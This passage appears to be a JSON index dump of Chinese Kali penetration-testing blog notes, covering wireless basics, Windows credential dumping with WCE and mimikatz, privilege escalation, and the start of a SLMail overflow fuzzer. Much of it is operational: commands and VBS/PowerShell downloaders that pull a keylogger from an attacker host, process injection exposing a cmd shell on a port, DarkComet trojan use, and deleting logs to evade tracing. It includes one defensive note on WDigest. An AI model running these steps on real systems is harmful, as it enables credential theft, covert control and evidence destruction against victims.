(RTS&#x2F;CTS)\n802.11b\n\n\n\n\n\n\n\n\nComplementary Code Keying (CCK)—–补充代码键\n\n5.5 and 11 Mbit&#x2F;s\n2.4GHz band (2.4GHz - 2.485GHz)\n14个重叠的信道channels\n\n\n\n\n\n\n\n\n\n\n\n\n每个信道22MHz宽带\n只有三个完全不重叠的信道\n\n美国 -1 to 11 (2.412 GHz - 2.462 GHz)\n欧洲 -1 to 13 (2.412 GHz - 2.472 GHz)\n日本 -1 to 14 (2.412 GHz - 2.482 GHz)\n注意：相邻两个无线设备的信道不要重叠，以免造成影响\n\n802.11a\n\n\n\n\n\n\n\n\n与802.11b几乎同时发布\n\n-因设备价格问题一直没有得到广泛使用?\n\n使用5GHz宽带\n\n-2.4GHz宽带干扰源多（微波、蓝牙、无绳电话）\n-5HGz频率有更多宽带空间，可容纳更多不重叠的信道\n-Orthogonal Frequency-Division Multiplexing (OFDM)信号调制方法\n-正交频分复用技\n\n\n更高速率54Mbps，每个信道20MHz宽带\n变频\n-5.15-5.35GHz室内\n-5.7-5.8GHz室外\n\n\n\n802.11g\n\n\n\n\n\n\n\n\n2.4GHz\nOrthogonal Frequency-Division Multiplexing (OFDM)信号调制方法?\n与802.11a速率相同\n可全局降速，向后兼容802.11b,并切换为CCK信号调制方法\n每个信号20&#x2F;22MHz宽带\n802.11n\n\n\n\n\n\n\n\n\n2.4或5 GHz频率\n\n300Mbps最高600Mbps\nMultiple-Input Multiple-Output (MIMO)多进多出通信技术\n多天线，多无线电波，独立收发信号\n可以使用40MHz信道带宽是数据传输速率翻倍\n\n全802.11n设备网络中，可以使用新报文格式，是速率达到最大\n每个信道20&#x2F;40MHz宽带\n无线网络运行模式\n\n\n\n\n\n\n\n\n\n无线网络架构\nInfrastructure（基础架构型）\nAP 维护SSID(无线网名称)\n\n\nAd-Hoc（无AP型）\nSTA维护SSID\n\n\n\n\nService Set Identifier (SSID，服务集标识符)\nAP每秒钟约10次通过Beacon帧广播SSID\n客户端连接到无线网络后也会宣告SSID\n\n\n\nInfrastructure（基础架构无线网络）\n\n\n\n\n\n\n\n\n\n至少包含一个 AP 和 一个 STATION（终端），形成一个 Basic Service Set (BSS)，BSSID指对应 AP 的 MAC。\nAP 连接到有线网络，称为 Distribution System (DS，分布式系统)。\n连接到同一个 DS 的多个 AP 形成 Extended Service Set (ESS，扩展服务集)，ESSID相当于交换机的MAC。\n\n\nAD-HOC\n\n\n\n\n\n\n\n\n也被称为Independent Basic Service Set (IBSS)\n有至少2个STAs直接通信组成\n也称为peer to peer模式\n其中一个STA（终端）负责AP的工作\n\n通过beacon广播SSID\n对其他STAs进行身份验证\n\nWIRELESS DISTRIBUTION SYSTEM (WDS)\n\n\n\n\n\n\n\n\n与有线DS类似，只是通过无线连接的多个AP组成的网络\n\nBridging——只有AP间彼此通信\nRepeating—–允许所有AP和STA（终端）进行通信\n\n\nMONITOR MODR模式\n\n\n\n\n\n\n\n\nMonitor不是一种真的无线模式\n\n但是对无线渗透至关重要\n允许无线网卡没有任何筛选的抓包(802.11包头)\n与有线网络的混杂模式可以类比\n合适的网卡和驱动不但可以monitor，更可以injection\n\n无线网硬件设备及基本概念无线网卡准备\n物理机运行kali\n\n虚拟机运行kali\n\n外置USB无线网卡（必须）\n\nTL-WN722N\n\ndmesg (硬件设备变化的记录)\n\n\niwconfig (查看无线网卡信息)\n\n\n\n\n\n选择无线网卡重点关注无线网卡的芯片型号\n台式机\n\nUSB无线网卡(不支持扩展天线)\nPCMCIA (16bit 已停产802.11b)\nCardbus (32bit PCMCIA 8.0标准)\nExpress Cards\nMiniPCI\nMiniPCI Express\nPCI接口卡\n\n\n发送功率：远程连接\n接收灵敏性：适当降低灵敏度，接收效果更佳\n各种型号的介绍：https://www.aircrack-ng.org/doku.php?id=compatibility_drivers_old\n\n无线渗透网卡没有所谓标准，但是Aircrack ng suite作者给出建议\n\nAlfa Networks AWUS036H无线网卡\n\nRealtek 8187芯片\n1000 mW发送功率\n天线: RP-SMA\n可扩展\n\n\n\n\n\n\n无线技术概念分贝dB\n\n测量无线信号强度\n\ndB：表示2个信号之间的差异比率，用于描述设备的信号强度\n\n是一个相对值\n\ndBm：功率值与1mW进行比较的dB值结果\n\n\n每增加3dBm，功率增加约1倍\n每增加10dBm，功率增加10倍\n\n\ndBi：全向天线辐射强度\n全向天线的信号功率增益\n增益是指信号功率强度增加了多少dB\n\n\n\n300mW的无线路由器，添加一个9dB的天线后功率如何变化(假设2dBi的电缆和接头耗损)\n\n换算回mW功率\n\ndBm功率相加等于mW功率相乘\n\ndBd：定向天线辐射强度\n\n定向天线的增益值\n全向天线在所有方向上收发信号，定向天线在指定方向的范围内收发信号\n天线增益越大信号传输距离越远\n\n\n既然有mW来表示功率为什么还要引入dB这个单位?\n\n接收信号时无线信号转变为高频电子脉冲，反之发射信号时高频电子脉冲转换为无线电波，这些过程功率往往要产生上万倍的变化，使用W、mW来计数非常不便，而dBm单位通过对功率的对数计算，使用一个较小的数值既可以比较直观的表达功率的变化，因此无线和声学系统都采用了dB这个单位。\n\n\n全向天线波形图\n\n甜甜圈\n\n\n天线选择的误区\n\n增益越高越好\n高功耗\n对周围环境的信号干扰\n\n\n\n\n增益过高的全向天线会变成定向天线\n\n\n\n\n5dBi 全向天线波形\n\n\n\n9dBi 全向天线波形\n\n\n\n定向天线\n定向发送信号\n功率相同时，比全向天线传输距离更远(方向正确的情况下)\n\n\n\n双四边形\n\n八木天线，引向反射天线\n\n平面天线\n\n","slug":"Kali渗透测试-无线渗透基础","date":"2023-01-02T01:28:24.000Z","categories_index":"无线渗透","tags_index":"Kali,无线渗透","author_index":"Aurora"},{"id":"8491666a2108b97c7f9058fe4b5a2b80","title":"Kali渗透测试-提权【三】","content":"WINDOWS身份认证过程\n\n\n\n\n\n\n\n\n\n当启动windows后，电脑首先会进入自检阶段，BOIS对硬件进行自检，然后找到计算中安装的第一个硬盘设备，从中定位到系统分区，找到操作系统所在的分区，按照路径找到操作系统内核文件，之后会进入用户登录的界面，这个界面被称为Windows NT Logon模块，用来对用户输入的账号密码进行计算和身份验证；winlogon.exe这个进程启动用户登录界面，当输入帐号密码后，这个进程会和LSA（本地安全助理）这个进程进行交互，由winlogon将身份验证信息传递给LSA AUTH API，再由LSA AUTH API对应的执行程序LSASRV.DLL动态链接库文件将身份验证信息传递给后端的账号数据库，再由账号数据库提取NTLM和LM两种哈希值进行比对，若比对值匹配winlogon进程则结束就进入操作系统；进入操作系统之后，在进入操作系统后系统会指派一个权限令牌到用户所登录启动的LSASS.exe进程中，这样用户就完成了登录过程。\n\n\n\n\n\n\n\n\n\n\n首先当通过登录窗口输入帐号密码后，winlogon进程对密码进行LMHash和NTHash（两个函数），通过这两个函数对密码进行计算，再将计算好的密码与后端的数据库，由LSA这个模块进行比对，若比对匹配就登录进入操作系统；若是网络登录同理。\n\n\n\n\n\n\n\n\n\n\n*账户在登陆的目标服务器&#x2F;系统后，系统中 WDisgest安全包会在内存中维护当前处于登录状态账户明文的密码，当注销登陆后才会被删除。* \nWCE（WINDOWS CREDENTIAL EDITOR）\n\n\n\n\n\n\n\n\n\nWindows Credentials Editor (WCE)（windows凭证信息编辑器）是一款功能强大的windows平台内网渗透工具。\n作用\n列举登陆会话，并且可以添加、改变和删除相关凭据（例如：LM&#x2F;NT hashes）。这些功能在内网渗透中能够被利用，例如，在windows平台上执行绕过hash或者从内存中获取NT&#x2F;LM hashes（也可以从交互式登陆、服务、远程桌面连接中获取）以用于进一步的攻击。可以查看系统当前登陆用户的登陆密码的密文形式和明文形式。\n\n\n要求\n使用需具有管理员权限\n\n\n\nwce-universal.exe参数\n-l：查看当前登录账号的密码的密文形式的哈希值【lmhash：nthash】\n\n-lv：表示查看更详细的信息【注入模式可能会对系统进程造成损坏】\n\n-r：每隔几秒去重新读下，看有没有新账户登录（默认5s）。\n\n-d：通过指定LUID删除某一会话。\n\n-g：计算指定密码的LM和NTLM哈希值。\n\n-w：读内存中 WDisgest 安全包维护的当前登录账户的明文密码。\n\n注意：wce是从内存中读取，pwdump是从数据库SAM中读取的！\n\n在xp机器上切换用户使其都处于登录状态\n\n-l参数：查看当前登录账号的密码的密文形式的哈希值【lmhash：nthash】\n\n-lv参数：表示查看更详细的信息【注入模式可能会对系统进程造成损坏】\n\n\n\n\n\n\n\n\n\n\n其中从内存中首先会以安全的模式读取（safe mode），若读取不成功，则会选择注入的方式（less-safe mode）获取信息；（注入方式可能会使系统报错）\n-d参数：删除LUID\n\n-g参数：计算LM和NTLM哈希值\n\n\n\n\n\n\n\n\n\n\n冒号分隔，前一段是LMHash，后一段是NTLMHash\n-w参数：读内存中 WDisgest 安全包维护的当前登录账户的明文密码。\n\n参数 -i + -s：（修改指定会话的登录信息）\n\n\n\n\n\n\n\n\n\n\n将test的LUID修改为admin帐户信息\n\nWCE攻击防御\n\n\n\n\n\n\n\n\n由于系统是通过 Digest Authentication Package 在内存中维护明文密码，默认自启动，为此可去注册表中关闭默认启动。\n注册表路径：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages\n删除其中的wdigest则查看不到明文密码\n\n\n\n\n\n\n\n\n\n\nSecurity Packages默认项：\n\nkerberos\nmsv1_0\nschannel\nwdigest 本地内存维护明文密码\ntspkg 远程终端维护……\npku2u\n\n相似工具fgdump\n\n\n\n\n\n\n\n\n路径：&#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;fgdump\n将fgdump文件夹上传到XP主机\n双击fgdump.exe会生成三个密码文件\n\n\n\n\n\n\n\n\n\n\n\n生成的文件其中会提取用户信息\nmimikatz双冒号::查看参数信息\n\nprivilege模块：提权\n\nsekurlsa模块：查看登录账号密码信息等\n\nprocess模块：管理进程\n\nservice模块：服务管理\n\n\n\n\n\n\n\n\n\nsuspend子模块：挂起进程，可用于植入木马时，暂停防病毒软件。\nresume子模块：进程恢复\n\nlsadump模块\n\nts模块：终端服务，默认情况下XP只允许一个活动的登录会话\n\n\n\n\n\n\n\n\n\n使用此模块相当于打上一个补丁，使多个会话可以并行，即多用户登录。\n\nevent模块：日志管理\n\n\n\n\n\n\n\n\n\nclear：清除已记录的安全日志等\ndrop：不再产生新的日志记录\n\nmisc模块：杂项\n\n\n","slug":"Kali渗透测试-提权【三】","date":"2023-01-01T02:25:14.000Z","categories_index":"权限提升","tags_index":"Kali,权限提升","author_index":"Aurora"},{"id":"a5f315a0a1ebf3c993f6279860b4eb67","title":"Kali渗透测试-提权【二】","content":"抓包嗅探\n\n\n\n\n\n\n\n\n\nWindows\nWireshark\nOmnipeek\n下载：https://www.liveaction.com/\nOmniPeek_UserGuide：https://mypeek.liveaction.com/elements/mypeek_documentation/manuals/OmniPeek_UserGuide.pdf\n\n\ncommview\n早期XP上使用\n\n\nSniffpass\n抓包收集密码\n下载：https://www.nirsoft.net/toolsdownload/sniffpass.zip\n\n\n\n\nLinux\nTcpdump\nWireshark\nDsniff\n\n\n\n当控制了一台主机之后，就可以在此主机上运行抓包嗅探工具获取更多的密码\n键盘记录\n\n\n\n\n\n\n\n\n\nKeylogger\n木马窃取\n\nKeylogger参见：https://noobxw.github.io/2022/12/22/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F/\n木马窃取-DarkComet生成服务器端\n\n\n\n启动侦听\n\n\n将生成的木马程序上传到客户端\n\n启动木马程序在服务端便可以侦听到\n\n右键打开远程桌面\n\n\n\n\n\n\n\n\n\n\n\n此时就可以进行实时的监控\n本地缓存密码\n\n\n\n\n\n\n\n\n\n浏览器缓存的密码\nIE浏览器\nFirefox\n\n\n网络密码\n无线密码\nhttp://www.nirsoft.net\nDump SAM\nPwdump\n&#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;fgdump&#x2F;\n\n\n\n浏览器缓存的密码Firefox\n\n\n\n\n\n\n\n\n\n\n各大浏览器中都会缓存密码\n网络密码\n无线密码\n密码还原工具集https://www.nirsoft.net/password_recovery_tools.html\nDump SAM\n\n\n\n\n\n\n\n\n操作系统本身不保存储帐号密码明文形式，保存的是账号密文形式，对密码进行哈希计算在操作系统中保存密码的哈希值，当登录操作系统输入明文密码后，登录组件进行相同的哈希计算，算出来的哈希值会和操作系统里的账号数据库中保存的密码哈希值进行比对，哈希值匹配则登录成功，否则反之。\n提取本地密码密文形式\n\n将用户名，密文复制下来，单独存个.pwdump文件，利用Kali中的解密工具解密\n\n\n\n\n\n\n\n\n\n\n\n其中not found表示破解失败，当密码大于8位的时候是很难破解的\nNET-NTLM2理解及hash破解：\nhttps://www.cnblogs.com/junsec/p/11810703.html\n","slug":"Kali渗透测试-提权【二】","date":"2022-12-29T02:20:18.000Z","categories_index":"权限提升","tags_index":"Kali,权限提升","author_index":"Aurora"},{"id":"815fe720fb340233ebbc2f80a6a91476","title":"Kali渗透测试-提权【一】","content":"本地提权\n\n\n\n\n\n\n\n\n\n已实现本地低权限账号登录\n远程溢出\n直接获取账号密码\n\n\n希望获取更高权限\n实现对目标进一步控制\n\n\n系统账号之间权限隔离\n操作系统安全的基础\n用户空间\n内核空间\n\n\n系统账号\n用户账号登陆时获取权限令牌\n服务账号无需用户登录已在后台启动服务\n\n\n\nWindows权限\n\n\n\n\n\n\n\n\n\nuser  # 普通用户权限\nAdministrator  # 管理员权限\nSysytem   # 系统权限\n\n\nLinux权限\n\n\n\n\n\n\n\n\n\nUser   # 普通用户权限\nRoot   # 最高权限\n\n系统工具提权at\n\n\n\n\n\n\n\n\n只能在XP与2003的系统上使用，win7之后at命令就被删除掉了\nat命令会调用system权限执行进而达到提权的目的\n\nat 10:54  &#x2F;interactive cmd\n\n\n\n\n\n\n\n\n\ninteractive  # 使用交互的方式执行，否则会在后台运行\n\n\n\n\n\n\n\n\n\n\n\n此时已经获得了system权限\n\n使explorer.exe进程改为system账号运行\n首先杀死explorer.exe，接着使用system窗口启动explorer\n\n\n\n\n\n\n\n\n\n\n此时的账号变为了system账号，explorer进程改为system用户启动\n此时启动执行任何操作都是system账号\n\n\nsc\n\n\n\n\n\n\n\n\nsc命令：创建，删除，编辑，调整现有的系统服务\n\nsc Create syscmd binPath&#x3D; “cmd &#x2F;K start” type&#x3D; own type&#x3D; interact\n\n\n\n\n\n\n\n\n\nCreate    # 创建一个系统服务\nsyscmd   # 服务名称（随便起）\nbinPath   # 执行一个命令；binPath&#x3D; “cmd &#x2F;K start”表示重新启动一个命令的窗口\ntype         # 服务类型；own由启动账号所拥有的服务；interact交互式，非后台运行\n\nservices.msc查看服务\n\nsc start syscmd启动服务\n\n\n\n\n\n\n\n\n\n\n服务在默认的情况下调用system账号下启动，最终达到提权的目的\n\n\nSysinternals Suite\n\n\n\n\n\n\n\n\n\nwindows系统提供的套件\n下载地址\nhttps://docs.microsoft.com/zh-cn/sysinternals/downloads/\n\n\n\n\nPsExec.exe -i -s cmd\n\n\n\n\n\n\n\n\n\n-i # 启动交互模式\n-s # 获取system权限\n\n\n\n注入进程提权\n\n\n\n\n\n\n\n\n\n原理\n\n将自己的进程注入到正在运行的 system 服务进程中，使其具有 system 账号权限（隐蔽性强）。\n\n\npinjector.exe进程注入器\n\nhttp://www.tarasco.org/security/Process_Injector/\n\n\n\n\npinjector\n\n\n\n\n\n\n\n\n\n-l   #  枚举当前身份验证信息\n-p  #  注入进程\n\n\npinjector.exe -l\n\n\n\n\n\n\n\n\n\n枚举出的进程都可以进行zhu’ru\n\n\n\n\npinjector.exe -p 668 cmd 5555\n\n\n\n\n\n\n\n\n\n运行此进程是开放在本地端口上的，当其他系统使用nc等工具连接此端口时，此端口就会将cmd交给对方\n\n\n\n\n\n\n\n\n\n\n\n\n\n端口已经被侦听\n此时进程列表当中不会被添加多余的进程，只是将自己的进程注入到原本正常的进程中，再开放一个端口，隐蔽性较高\n\n使用nc连接\n\n\n\n","slug":"Kali渗透测试-提权【一】","date":"2022-12-24T02:19:07.000Z","categories_index":"权限提升","tags_index":"Kali,权限提升","author_index":"Aurora"},{"id":"755b3499f4fdd2a688f548741850cfad","title":"Kali渗透测试-后渗透","content":"后渗透\n\n\n\n\n\n\n\n\n拿下目标服务器的shell后，避免管理员为漏洞打上补丁，之后就再也不能控制目标系统；由此，拿下目标主机shell后需要进行后渗透。\n\n上传工具\n提权\n若是拿到普通用户权限需要进行提权\n\n\n擦除攻击痕迹\n防止溯源\n\n\n安装后门\n长期控制\nDump 密码\n内网渗透\n\n\n后渗透阶段\n最大的挑战—防病毒软件\n使用合法的远程控制软件\n\n\n\n上传工具\n\n\n\n\n\n\n\n\n若控制的系统是Linux系统，目标系统会默认安装netcat、curl、wget；拿下目标主机后使用默认安装的工具下载木马或者远程控制软件。\n若控制的系统是Windows系统，缺少预装的下载工具。\n（相对于windows，linux更加容易实现木马或者远程工具的下载与安装）\n交互式与非交互式shell非交互式shell（需要在windows系统下安装ftp服务）\n\n\n\n\n\n\n\n\n\n\n在已经进入到非交互型的shell中，接着进入下一个子命令后，进一步输入帐号密码时无法执行后面的操作\n交互式shell\n\n\n\n\n\n\n\n\n\n在交互式shell中，可以正常执行后面的操作\n对于nc侦听到的非交互式shell中，无法正常执行后面的操作，因此需要上传能够获得完整的交互式shell的后门或者木马进而完全控制目标主机。\nTFTP传输\n\n\n\n\n\n\n\n\nXP、2003中已默认安装，Win7、2008以后的系统需要单独添加，但经常被边界防火墙过滤。主流为FTP，是因为基于UDP协议，明文传输，不支持身份验证（无需登录验证即可下载服务器文件）。\n思路：\n在kali主机中创建一个目录，把此目录指定为TFTP服务主目录，再拷贝一个后门或者木马程序拷贝到TFTP主目录，在windows端使用TFTP命令将后门或者木马程序下载下来。\nkali主机配置tftp服务1、在kali主机创建TFTP主目录：mkdir &#x2F;tftp\n2、修改目录权限：chown -R nobody &#x2F;tftp&#x2F;    # 将所有者改成nobody，主目录中所有文件的属组都必须是nobody，这样才能被下载\n3、cp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;whoami.exe &#x2F;tftp   # 查看windows当前用户\n4、cp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;klogger.exe &#x2F;tftp  # 拷贝键盘记录器\n5、atftpd --daemon --port 69 &#x2F;tftp   #启动服务，--daemon表示以后台的方式启动，指定端口69，主目录tftp\n6、\n\n\n\n\n\n\n\n\n\n\n\n\n确保tftp服务是由atftpd这个进程所启动的\nwindows端下载后门程序进入tftp\n\n使用tftp -i 192.168.216.176 get whoami.exe/klogger.exe下载到windows端\n\n查看是否传输到windows端\n\n\n使用tasklist查看进程是否运行\n\n\n其中使用klogger.exe时，必须是在对应权限用户敲击键盘之后才会记录文件；现在获取到的权限是system，而此时klogger.exe文件是在system权限下执行的，所以其他用户敲击键盘是不会记录的\n\n\n\n\n\n\n\n\n\n\n1.txt是在system权限下创建的，其中有一些字符，klogger并没有进行记录；之后在windows端使用administrator用户运行klogger，使klogger在administrator权限下运行，再随机敲击键盘会生成klooger.txt文件，其中记录了administrator用户的键盘记录信息。\nFTP传输kali安装FTP服务\napt-get install pure-ftpd     # 安装pure-ftpd（vsftpd也可以）\n\n配置脚本（ftp1.sh）\n#!/bin/bash\ngroupadd ftpgroup\nuseradd -g ftpgroup -d /dev/null -s /etc ftpuser\npure-pw useradd test -u ftpuser -d /ftphome\npure-pw mkdb\ncd /etc/pure-ftpd/auth/\nln -s ../conf/PureDB 60pdb\nmkdir -p /ftphome\nchown -R ftpuser:ftpgroup /ftphome/       #创建的ftp主目录\n/etc/init.d/pure-ftpd restart\n\n执行脚本\n.&#x2F;ftp1.sh # 由于脚本中会添加用户，执行过程中需要为创建的用户输入密码\n\n上传后门\nls &#x2F;ftphome&#x2F;\ncp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;whoami.exe &#x2F;ftphome&#x2F;\ncp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;klogger.exe &#x2F;ftphome&#x2F;\n\n\n\n\n\n\n\n\n\n\n由于目前获得的shell是非交互模式的，ftp传输时，在password命令处无法显示，所以当前直接利用ftp下载是行不通的；\n思路：\n将要执行的命令写到目标服务器的文本文件中，windows上执行ftp命令读取文本文件的命令进行下载。\n上传文件\nC:\\&gt;echo open 192.168.216.176 21&gt;ftp.txt     \nC:\\&gt;echo test&gt;&gt;ftp.txt\nC:\\&gt;echo password&gt;&gt;ftp.txt　　　　# password是前面设置的密码\nC:\\&gt;echo bin&gt;&gt;ftp.txt            # bin表示使用二进制的传输方式传输\nC:\\&gt;echo GET whoami.exe &gt;&gt; ftp.txt\nC:\\&gt;echo GET klogger.exe &gt;&gt; ftp.txt\nC:\\&gt;echo bye &gt;&gt; ftp.txt\n\nC:\\&gt;type ftp.txt        # type命令查看ftp.txt内容\ntype ftp.txt\nopen 192.168.216.176 21\ntest\npassword\nbin\nGET whoami.exe \nGET klogger.exe \nbye \n\nC:\\&gt;ftp -s:ftp.txt    # ftp -s表示让ftp调用文本文件中的命令去执行\n\nC:\\&gt;whoami \nwhoami\nNT AUTHORITY\\SYSTEM\n\n\n\n\n\n\n\n\n\n\n步骤是和TFTP是一样的，唯一不同的就是tftp是交互型shell，ftp是非交互型shell\nVbscript传输\n\n\n\n\n\n\n\n\nVBS是windows系统上默认的解释型脚本语言，在win7后增加了perl，通过web程序，http协议下载远程控制程序。\n启动kali自带的Apache服务\n&#x2F;etc&#x2F;init.d&#x2F;apache2 start     \n&#x2F;etc&#x2F;init.d&#x2F;apache2 status\n\n\ncd &#x2F;var&#x2F;www&#x2F;html&#x2F;\ncp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;klogger.exe &#x2F;var&#x2F;www&#x2F;html\ncp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;whoami.exe &#x2F;var&#x2F;www&#x2F;html\n\n上传文件（wget.vbs）\necho strUrl &#x3D; WScript.Arguments.Item(0) &gt; wget.vbs\necho StrFile &#x3D; WScript.Arguments.Item(1) &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXSEITTING_DEFAULT &#x3D; 0 &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXSEITTING_PRECONFIG &#x3D; 0 &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXSEITTING_DIRECT &#x3D; 1 &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXSEITTING_PROXY &#x3D; 2 &gt;&gt; wget.vbs\necho Dim http, varByteArray, strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs\necho Err.Clear &gt;&gt; wget.vbs\necho Set http &#x3D; Nothing &gt;&gt; wget.vbs\necho Set http &#x3D; CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs\necho If http Is Noting Then Set http &#x3D; CreateObjiect(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs\necho If http Is Noting Then Set http &#x3D; CreateObjiect(&quot;WinHttp.MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs\necho If http Is Noting Then Set http &#x3D; CreateObjiect(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs\necho http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs\necho http.Send &gt;&gt; wget.vbs\necho varByteArray &#x3D; http.ResponseBody &gt;&gt; wget.vbs\necho Set http &#x3D; Noting &gt;&gt; wget.vbs\necho Set fs &#x3D; CreateObject(&quot;Scrippting.FileSystemObject&quot;) &gt;&gt; wget.vbs\necho Set ts &#x3D; fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs\necho strData &#x3D; &quot;&quot; &gt;&gt; wget.vbs\necho strBuffer &#x3D; &quot;&quot; &gt;&gt; wget.vbs\necho For lngCounter &#x3D; 0 to UBound(varByteArray) &gt;&gt; wget.vbs\necho ts.Write Chr(255 And Ascb(Miidb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs\necho Next &gt;&gt; wget.vbs\necho ts.Close &gt;&gt; wget.vbs\n\n#以上命令分批次传输，不要一次性传输，可能会传输不完整\n\n\n\n\n\n\n\n\n\n\n\nvbscript也是一种解释性脚本语言，需要使用windows自带的cscript命令调用vbscript脚本\n使用以下命令下载后门文件\ncscript wget.vbs http:&#x2F;&#x2F;192.168.216.176&#x2F;whoami.exe whoami.exe\n\nPOWERSHELL传输\n\n\n\n\n\n\n\n\n类似vbs的传输，依旧是通过web服务,http协议到目标服务器下载程序，注意需在win7,win8以后的系统运行。后缀必须命名成ps1。\n$strongeDir = $pwd\n$webclient = New-Object System.Net.WebClient\n$url = \"http://192.168.216.176/whoami.exe\"\n$file = \"new-exsploit.exe\"  # 下载下来存到本地的文件名\n$webclient DownloadFile($url,$file)\n\n\n使用以下命令下载\npowershell.exe -ExecutionPolicy Bypass  -NoLogo -Nonlnteractive -Noprofile -File wget.ps1\n\n\n\n\n\n\n\n\n\n\n注意：在win7以后的系统里才会有powershell\n擦除痕迹\n\n\n\n\n\n\n\n\n以Slmail为例\n打开C:\\Program Files\\SLmail\\System文件夹，其中有应用程序日志，随便打开一个 应用程序日志，会发现有很多条日志发送了很多‘A’，对于管理员来说很容易发现主机是被入侵了\n\n使用kali打开相应应用程序目录删除对应的日志文件即可\n\n","slug":"Kali渗透测试-后渗透","date":"2022-12-22T09:25:03.000Z","categories_index":"后渗透","tags_index":"Kali,后渗透","author_index":"Aurora"},{"id":"df6f9f609e4433344bf39ccbf49e3ca8","title":"Kali渗透测试-缓冲区溢出【Windows】","content":"0Day\n\n\n\n\n\n\n\n\n零日漏洞\n\n未被官方所发现和公开\n只掌握在个人手里\n\n缓冲区\n\n又称为缓存，它是内存空间的一部分\n内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。\n\n缓冲区溢出\n缓冲区溢出\n\n0Day中最主要的攻击方式\n\n控制目标机器\n\n原理：当缓冲区边界限制不严格时，由于变量传入畸形数据或程序运行错误，导致缓冲区被“撑爆”，从而覆盖了相邻内存区域的数据；若成功修改内存数据，可造成进程劫持，执行恶意代码，获取服务器控制权等后果。\nhttps://www.cnblogs.com/fanzhidongyzby/archive/2013/08/10/3250405.html\n\n\n如何发现漏洞\n\n\n\n\n\n\n\n\n\n源码审计\n拿到源码检查相应的安全漏洞\n\n\n逆向工程\n只能得到安装包，拿不到源码，对安装包进行逆向工程，反汇编\n\n\n模糊测试\n向程序堆栈半随机的数据，根据内存变化判断溢出\n数据生成器：生成随机，半随机数据\n测试工具：识别溢出漏洞\n\n\n\nWindows缓冲区溢出\n\n\n\n\n\n\n\n\n实验环境：\n\nkali\nwindows _xp_sp3\n\n工具：\n\nSLMail 5.5.0 Mail Server（邮件服务器）\n下载地址：https://slmail.software.informer.com/download/#downloading\n\n\nImmunityDebugger_1_85_setup.exe（动态调试工具）\n下载地址：https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/Immunity-Debugger.shtml\n\n\nmona.py\n下载地址：https://github.com/corelan/mona\n使用手册：https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/\n\n\nRegSnap\n下载地址：https://www.onlinedown.net/soft/38491.html\n\n\n\n注：win7以上系统完整的支持操作系统安全防护机制，若是进行溢出就需要绕过安全防护机制，本实验主要是对于溢出过程的了解与掌握。\nSLMail 5.5.0 Mail Server 安装\n\n\n\n\n\n\n\n\n\n\n\n\n\nImmunityDebugger_1_85_setup.exe的安装\n\n\n\n\n\n\n\n\n直接点击安装包安装即可\nmona.py 安装\n\n\n\n\n\n\n\n\nmona.py直接放在ImmunityDebugger_1_85_setup.exe安装路径下的PyCommands文件夹下\n\nFUZZER模糊测试\n\n\n\n\n\n\n\n\n\n整体思路：\n\n在提交数据的地方向程序发送各种字符组合，在服务器端使用Debuger调试程序，查看不同的数据被提交到110端口，被POP3服务解析，把数据放到内存中执行的过程是否会发生缓冲区溢出。\n\n\nFUZZ模糊测试\n\n所谓模糊测试，就是在未知的情形下一步一步的进行探测，例如在USER命令下加上100个参数没有溢出，再加1000个，或者再加10000个，最终若没有探测出USER命令存在缓冲区溢出的迹象的话，就换一下命令PASS进行测试，以此类推。\n\n\nSLMail 5.5.0 Mail Server\n\nports：25 110 139 8376\nPOP3 PASS 命令存在缓冲区溢出漏洞\n无需身份验证实现远程代码执行\n\n\nwin7以上安全机制\n\nDEP：阻止代码从数据页被执行\nASLR：随机内存地址加载执行程序和DLL，每次重启地址变化\n\n\n\n测试端口连通性\n\n\n\n\n\n\n\n\n设置防火墙规则：开放25和110端口或者关闭防火墙\n\n\n\n\n\n\n\n\n\n\n如果想要研究这个邮件服务器是否存在漏洞，就需要向目标端口提交数据和输入指令的地方进行检测。\n测试\n\n\n\n\n\n\n\n\n\n由于在不清楚目标系统是否存在缓冲区溢出漏洞的情况下需要每一个命令加上大量数据检测一遍，通常需要使用脚本来执行\n\n对于未知协议\n\n查询标准RFC了解此协议有什么指令，带什么参数，尝试探测缓冲区漏洞\n\nwireshark抓包了解学习未知协议，再通过脚本进行探测\n\n\n\n\n使用python2执行测试脚本\n\n#!/usr/bin/python\n#-*-coding:utf-8-*-\nimport socket\ns = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n \ntry:\n   print(\"\\nSending evil buffer...\")\n   s.connect((\"192.168.216.172\",110))\n   data = s.recv(1024)               ###将110端口返回的数据显示在屏幕中\n   print(data)\n \n   s.send(\"USER test\"+\"\\r\\n\")\n   data = s.recv(1024)\n   print(data)\n \n   s.send(\"PASS test\"+\"\\r\\n\")\n   data = s.recv(1024)\n   print(data)\n \n   s.close()\n   print \"\\nDone\"\n \nexcept:\n   print(\"Could not connect to 